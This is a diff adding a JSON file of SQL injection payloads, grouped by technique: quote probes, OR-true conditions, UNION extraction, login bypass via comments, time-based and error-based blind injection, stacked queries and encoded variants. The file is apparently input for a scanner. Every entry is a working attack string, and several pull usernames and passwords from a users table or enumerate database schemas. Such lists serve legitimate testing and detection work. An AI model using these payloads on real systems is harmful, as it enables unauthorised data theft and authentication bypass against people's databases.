@@ -1,0 +1,176 @@
+{
+    "payload_families": {
+        "single_quote": {
+            "description": "Basic quote-based error detection",
+            "payloads": [
+                "'",
+                "''",
+                "'--",
+                "' #",
+                "\"",
+                "`",
+                "\\",
+                "1'",
+                "test'",
+                "'; --",
+                "1\"",
+                "1`",
+                "'/**/",
+                "'%09",
+                "'%0a",
+                "'%00",
+                "CHAR(39)"
+            ]
+        },
+        "or_true": {
+            "description": "Boolean-based OR true condition",
+            "payloads": [
+                "' OR '1'='1",
+                "' OR '1'='1'--",
+                "' OR '1'='1' #",
+                "1' OR 1=1--",
+                "1' OR 1=1 #",
+                "' OR 'a'='a",
+                "1 OR 1=1",
+                "1 OR 1=1--",
+                "1 OR 1=1#",
+                "2 OR 1=1",
+                "1 OR 2>1",
+                "0 OR 1=1",
+                "' OR true--",
+                "' OR 'abc'='abc",
+                "1 OR '1'='1'",
+                "' OR 1=1 LIMIT 1--",
+                "') OR ('1'='1",
+                "' OR 1-- -",
+                "'/**/OR/**/1=1--",
+                "' OR 0x31=0x31--",
+                "' OR (SELECT 1)=1--",
+                "%27%20OR%201%3D1--",
+                "' OR 'x'='x'/*"
+            ]
+        },
+        "union_select": {
+            "description": "UNION-based data extraction",
+            "payloads": [
+                "' UNION SELECT 1,2--",
+                "' UNION SELECT 1,2 #",
+                "' UNION SELECT user(),version()--",
+                "' UNION SELECT null,null--",
+                "1' UNION SELECT user, password FROM users--",
+                "1' UNION SELECT user, password FROM users #",
+                "' UNION SELECT table_name,null FROM information_schema.tables--",
+                "1 UNION SELECT user, password FROM users",
+                "1 UNION SELECT user, password FROM users--",
+                "1 UNION SELECT user, password FROM users#",
+                "1 UNION SELECT first_name, last_name FROM users",
+                "0 UNION SELECT user, password FROM users",
+                "1 UNION SELECT 1,2",
+                "1 UNION SELECT user(),version()",
+                "' UNION SELECT 1--",
+                "' UNION SELECT 1,2,3--",
+                "' UNION SELECT 1,2,3,4--",
+                "' UNION SELECT 1,2,3,4,5--",
+                "' UNION ALL SELECT user(),version()--",
+                "' UNION SELECT @@version,null--",
+                "' UNION SELECT database(),null--",
+                "' UNION SELECT schema_name,null FROM information_schema.schemata--",
+                "' UNION SELECT group_concat(table_name),null FROM information_schema.tables WHERE table_schema=database()--",
+                "' UNION/**/SELECT/**/1,2--",
+                "' UNION%0aSELECT%0a1,2--",
+                "'/**/UNION/**/ALL/**/SELECT/**/user(),version()--",
+                "' UNION/*!50000SELECT*/1,2--"
+            ]
+        },
+        "comment_bypass": {
+            "description": "Comment-based authentication bypass",
+            "payloads": [
+                "admin'--",
+                "admin' #",
+                "admin'/*",
+                "') OR ('1'='1'--",
+                "admin\"--",
+                "admin\" #",
+                "\" OR \"1\"=\"1",
+                "') OR ('1'='1",
+                "' OR 1=1/*",
+                "admin'-- -",
+                "admin'%23",
+                "admin'%0A--",
+                "aDmIn'--",
+                "admin'/*!50000OR*/1=1--"
+            ]
+        },
+        "time_based": {
+            "description": "Time-based blind injection",
+            "payloads": [
+                "' AND SLEEP(5)--",
+                "1' AND SLEEP(5)--",
+                "' OR SLEEP(5)--",
+                "'; WAITFOR DELAY '0:0:5'--",
+                "1 AND SLEEP(5)",
+                "1 AND SLEEP(5)--",
+                "1 AND SLEEP(5)#",
+                "' AND SLEEP(10)--",
+                "' OR SLEEP(5)#",
+                "'; SELECT SLEEP(5)--",
+                "1'; WAITFOR DELAY '0:0:5'--",
+                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "' AND SLEEP(5)%23",
+                "1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--",
+                "' OR SLEEP(5)/*"
+            ]
+        },
+        "error_based": {
+            "description": "Error-based extraction",
+            "payloads": [
+                "' AND 1=1--",
+                "' AND 1=2--",
+                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+                "' AND extractvalue(1,concat(0x7e,version()))--",
+                "1 AND 1=1",
+                "1 AND 1=2",
+                "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+                "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+                "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
+                "' AND GTID_SUBSET(CONCAT(0x7e,version()),0)--",
+                "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",
+                "' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,version()))x))--",
+                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--"
+            ]
+        },
+        "stacked": {
+            "description": "Stacked queries (if supported)",
+            "payloads": [
+                "'; SELECT 1--",
+                "'; SELECT user()--",
+                "1; SELECT 1",
+                "1; SELECT user()",
+                "'; SELECT version()--",
+                "1; SELECT database()",
+                "'; SELECT table_name FROM information_schema.tables--"
+            ]
+        },
+        "encoded": {
+            "description": "URL/double encoded variants",
+            "payloads": [
+                "%27%20OR%20%271%27%3D%271",
+                "%27%20UNION%20SELECT%201%2C2--",
+                "1%20OR%201%3D1",
+                "1%20UNION%20SELECT%20user%2Cpassword%20FROM%20users",
+                "%27+OR+1%3D1--",
+                "%27+UNION+SELECT+1%2C2--",
+                "%2527",
+                "%27%20OR%20true--",
+                "%27%20AND%20SLEEP(5)--",
+                "1%27%20OR%201%3D1--",
+                "%2527%2520OR%25201%253D1--",
+                "%27%20O%52%201%3D1--",
+                "1%2BOR%2B1%3D1",
+                "%27%0aOR%0a%271%27%3D%271",
+                "%27+UNION+ALL+SELECT+NULL%2CNULL--"
+            ]
+        }
+    }
+}
